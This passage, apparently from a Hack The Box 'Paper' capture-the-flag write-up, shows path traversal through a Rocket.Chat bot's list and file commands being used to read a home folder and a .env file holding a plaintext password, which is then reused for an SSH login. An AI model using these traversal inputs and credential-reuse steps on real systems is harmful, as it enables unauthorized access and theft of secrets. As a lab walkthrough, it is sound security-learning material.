</span><span class="z-text z-plain">- What time is it?
</span><span class="z-text z-plain">- What new files are in your sale directory?
</span><span class="z-text z-plain">- Why did the salesman crossed the road?
</span><span class="z-text z-plain">- What&#39;s the content of file x in your sales directory? etc.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Please note that I am a beta version and I still have some bugs to be fixed.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">How to use me ? :
</span><span class="z-text z-plain">1. Small Talk:
</span><span class="z-text z-plain">You can ask me how dwight&#39;s weekend was, or did he watched the game last night etc.
</span><span class="z-text z-plain">eg: &#39;recyclops how was your weekend?&#39; or &#39;recyclops did you watched the game last night?&#39; or &#39;recyclops what kind of bear is the best?
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">2. Joke:
</span><span class="z-text z-plain">You can ask me Why the salesman crossed the road.
</span><span class="z-text z-plain">eg: &#39;recyclops why did the salesman crossed the road?&#39;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">&lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&gt;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">For security reasons, the access is limited to the Sales folder.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">3. Files:
</span><span class="z-text z-plain">eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file sale/secret.xls&#39; or just &#39;recyclops file test.txt&#39;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">4. List:
</span><span class="z-text z-plain">You can ask me to list the files
</span><span class="z-text z-plain">eg: &#39;recyclops i need directory list sale&#39; or just &#39;recyclops list sale&#39;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">5. Time:
</span><span class="z-text z-plain">You can ask me what the time is
</span><span class="z-text z-plain">eg: &#39;recyclops what time is it?&#39; or just &#39;recyclops time&#39;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">That&#39;s what I am capable of doing right now.
</span><span class="z-text z-plain">Also, Dwight is a cool guy and not a Time Thief!
</span></code></pre>
<p>This is the same message we saw on the <code>#general</code> channel.</p>
<p>I'll send <code>list</code> this time:</p>
<pre class="z-code"><code><span class="z-text z-plain">Fetching the directory listing of /sales/ 
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">total 8
</span><span class="z-text z-plain">drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
</span><span class="z-text z-plain">drwx------ 11 dwight dwight 4096 Mar 8 03:48 ..
</span><span class="z-text z-plain">drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
</span><span class="z-text z-plain">drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
</span></code></pre>
<p>It looks like the output of the <code>ls -la</code> command.</p>
<p>Let's try to enter a non existent folder after <code>list</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">Fetching the directory listing of nonExistent
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">ls: cannot access &#39;/home/dwight/sales/nonExistent&#39;: No such file or directory 
</span></code></pre>
<p>The error message discloses that this bot reads the content of the
<code>/home/dwight/sales</code> folder, and that whatever we pass him as arguments gets
appended after to this path.</p>
<h4 id="lfi">LFI</h4>
<p>Since we can give <code>recyclops</code> arguments that are appended to the
<code>/home/dwight/sales</code> path and used for <code>ls</code>, it may be vulnerable to path
traversal!</p>
<p>Let's check if this is the case by sending the bot a <code>list ../</code> message:</p>
<pre class="z-code"><code><span class="z-text z-plain">Fetching the directory listing of ../
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">total 32604
</span><span class="z-text z-plain">drwx------ 11 dwight dwight 4096 Mar 8 03:48 .
</span><span class="z-text z-plain">drwxr-xr-x. 3 root root 20 Mar 8 03:50 ..
</span><span class="z-text z-plain">lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
</span><span class="z-text z-plain">drwx------ 5 dwight dwight 56 Jul 3 2021 .config
</span><span class="z-text z-plain">-rw------- 1 dwight dwight 9 Jan 22 06:26 .dbshell
</span><span class="z-text z-plain">-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
</span><span class="z-text z-plain">drwx------ 3 dwight dwight 69 Jan 22 06:27 .gnupg
</span><span class="z-text z-plain">drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
</span><span class="z-text z-plain">-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
</span><span class="z-text z-plain">-rw-rw-r-- 1 dwight dwight 6571921 Feb 26 14:57 linpeas_fat.sh
</span><span class="z-text z-plain">-rw-rw-r-- 1 dwight dwight 26641089 Feb 26 14:57 linpeas_fat.sh.1
</span><span class="z-text z-plain">drwx------ 3 dwight dwight 19 Jul 3 2021 .local
</span><span class="z-text z-plain">drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
</span><span class="z-text z-plain">drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
</span><span class="z-text z-plain">-rwxrwxr-x 1 dwight dwight 9627 Mar 8 03:46 poc.sh
</span><span class="z-text z-plain">drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
</span><span class="z-text z-plain">drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
</span><span class="z-text z-plain">-r-------- 1 dwight dwight 33 Jan 22 05:53 user.txt
</span><span class="z-text z-plain">drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
</span><span class="z-text z-plain">-rw------- 1 dwight dwight 1124 Mar 8 03:40 .viminfo
</span><span class="z-text z-plain">-rw-rw-r-- 1 dwight dwight 105322 Mar 8 03:32 wget-log
</span></code></pre>
<p>It returns the content of the <code>/home/dwight</code> folder, <code>dwight</code>'s home folder! We
got ourselves a LFI here.</p>
<h4 id="inspecting-home-dwight-bot-restart-sh">Inspecting <code>/home/dwight/bot_restart.sh</code></h4>
<p>The most intriguing file to me in <code>dwight</code>'s home folder is the <code>bot_restart.sh</code>
file, so let's inspect it by sending the bot the <code>file ../bot_restart.sh</code>
message.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Cleaning hubot&#39;s log so that it won&#39;t grow too large.</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/home/dwight/hubot/.hubot.log</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> For starting the bot 20-ish (10+20) seconds late, when the server is restarted.</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> This is because MongoDB and Rocket-Chat server needs some time to startup properly</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 10s</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Checks if Hubot is running every 10s</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-while z-shell">while</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> 1 <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span>
</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sleep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 20s</span>
</span><span class="z-source z-shell z-bash">    <span class="z-variable z-other z-readwrite z-assignment z-shell">alive</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/sbin/ss</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tulnp</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> 8000</span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>n</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">alive</span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
</span><span class="z-source z-shell z-bash">        <span class="z-variable z-other z-readwrite z-assignment z-shell">err</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>unhandled-rejections=strict<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> /home/dwight/hubot/.hubot.log</span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>n</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">err</span></span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
</span><span class="z-source z-shell z-bash">            <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Restarts bot</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[-] Bot not running! <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash">            <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">Killing the old process</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">            <span class="z-variable z-other z-readwrite z-assignment z-shell">pid</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ps</span></span><span class="z-meta z-function-call z-arguments z-shell"> aux</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>hubot -a rocketchat<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> grep</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span> <span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f6</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
</span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> -9 <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">pid</span></span></span>
</span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot</span>
</span><span class="z-source z-shell z-bash">            <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Cleaning hubot&#39;s log so that it won&#39;t grow too large.</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/home/dwight/hubot/.hubot.log</span>
</span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">bash</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot/start_bot.sh</span> <span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span>
</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-else z-shell">else</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[+] Bot running succesfully! <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-else z-shell">else</span>
</span><span class="z-source z-shell z-bash">        <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Restarts bot</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>[-] Bot not running! <span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span><span class="z-source z-shell z-bash">        <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">Killing the old process</span><span class="z-comment z-line z-number-sign z-shell">
</span></span><span class="z-source z-shell z-bash">        <span class="z-variable z-other z-readwrite z-assignment z-shell">pid</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ps</span></span><span class="z-meta z-function-call z-arguments z-shell"> aux</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>hubot -a rocketchat<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> grep</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span> <span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f6</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-kill z-shell">kill</span></span><span class="z-meta z-function-call z-arguments z-shell"> -9 <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">pid</span></span></span>
</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-cd z-shell">cd</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot</span>
</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">bash</span></span><span class="z-meta z-function-call z-arguments z-shell"> /home/dwight/hubot/start_bot.sh</span> <span class="z-keyword z-operator z-logical z-job z-shell">&amp;</span>
</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
</span><span class="z-source z-shell z-bash">
</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-end z-shell">done</span>
</span></code></pre>
<p>This Bash script basically kills the bot process, cleans up the log file, and
launches the <code>/home/dwight/hubot/start_bot.sh</code> file, probably to start the bot.</p>
<p>Interestingly, the launch script and log file are stored in the <code>hubot</code> folder
in <code>/home/dwight</code>. That's really intriguing, I've never heard of this technology
before, so let's check it up online:</p>
<blockquote>
<p>Hubot is your friendly robot sidekick. Install him in your company to
dramatically improve employee efficiency.</p>
<p>— <a href="https://hubot.github.com/">Hubot</a></p>
</blockquote>
<p>That's what <code>recyclops</code> is using under the hood! It must contain interesting
information, let's explore the <code>hubot</code> folder.</p>
<h4 id="exploring-home-dwight-hubot">Exploring <code>/home/dwight/hubot</code></h4>
<p>Let's use the bot <code>list</code> command to check this folder content.</p>
<pre class="z-code"><code><span class="z-text z-plain">Fetching the directory listing of ../hubot
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">total 152
</span><span class="z-text z-plain">drwx------ 8 dwight dwight 4096 Sep 16 2021 .
</span><span class="z-text z-plain">drwx------ 11 dwight dwight 4096 Mar 8 03:48 ..
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
</span><span class="z-text z-plain">srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
</span><span class="z-text z-plain">srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
</span><span class="z-text z-plain">drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
</span><span class="z-text z-plain">drwx------ 8 dwight dwight 163 Jul 3 2021 .git
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
</span><span class="z-text z-plain">-rw-r--r-- 1 dwight dwight 24772 Mar 17 05:20 .hubot.log
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
</span><span class="z-text z-plain">drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
</span><span class="z-text z-plain">drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
</span><span class="z-text z-plain">drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
</span><span class="z-text z-plain">drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
</span><span class="z-text z-plain">-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
</span></code></pre>
<p>It contains a bunch of files, including Git-related and VScode-related files.</p>
<p>However, I immediately noticed the <code>.env</code> file, since this type of file is
usually used to store secrets... Let's retrieve its content!</p>
<pre class="z-code"><code><span class="z-text z-plain">export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39;
</span><span class="z-text z-plain">export ROCKETCHAT_USER=recyclops
</span><span class="z-text z-plain">export ROCKETCHAT_PASSWORD=Queenofblad3s!23
</span><span class="z-text z-plain">export ROCKETCHAT_USESSL=false
</span><span class="z-text z-plain">export RESPOND_TO_DM=true
</span><span class="z-text z-plain">export RESPOND_TO_EDITED=true
</span><span class="z-text z-plain">export PORT=8000
</span><span class="z-text z-plain">export BIND_ADDRESS=127.0.0.1
</span></code></pre>
<p>Bingo! It contains a few secrets variables, and one is named
<code>ROCKETCHAT_PASSWORD</code>! Its value is set to <code>Queenofblad3s!23</code>.</p>
<h4 id="exploration-5">Exploration</h4>
<p>If we try to log in to <a href="https://www.rocket.chat/">Rocket.Chat</a> as <code>recyclops</code>
with the password we just found, we get an error message indicating that bots
can't log in.</p>
<h2 id="foothold-ssh">Foothold (SSH)</h2>
<p>The source code of this bot was located in <code>dwight</code>'s home folder, so he's
likely the author of it, meaning that the bot's password might also be his!
Let's check if this is the case.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>dwight@10.10.11.143<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.143 (10.10.11.143)&#39; can&#39;t be established.
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">dwight@10.10.11.143&#39;s password:
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">[dwight@paper ~]$
</span></code></pre>
<p>Nice!</p>
<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
<p>If we run <code>whoami</code>, we see that we got a foothold as <code>dwight</code> (obviously).</p>
<h3 id="architecture">Architecture</h3>
<p>What is Paper's architecture?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">x86_64
</span></code></pre>
<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
<h3 id="distribution">Distribution</h3>
<p>Let's see which distribution Paper is using.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/os-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">NAME=&quot;CentOS Linux&quot;
</span><span class="z-text z-plain">VERSION=&quot;8&quot;
</span><span class="z-text z-plain">ID=&quot;centos&quot;
</span><span class="z-text z-plain">ID_LIKE=&quot;rhel fedora&quot;
</span><span class="z-text z-plain">VERSION_ID=&quot;8&quot;
</span><span class="z-text z-plain">PLATFORM_ID=&quot;platform:el8&quot;
</span><span class="z-text z-plain">PRETTY_NAME=&quot;CentOS Linux 8&quot;
</span><span class="z-text z-plain">ANSI_COLOR=&quot;0;31&quot;
</span><span class="z-text z-plain">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;
</span><span class="z-text z-plain">HOME_URL=&quot;https://centos.org/&quot;
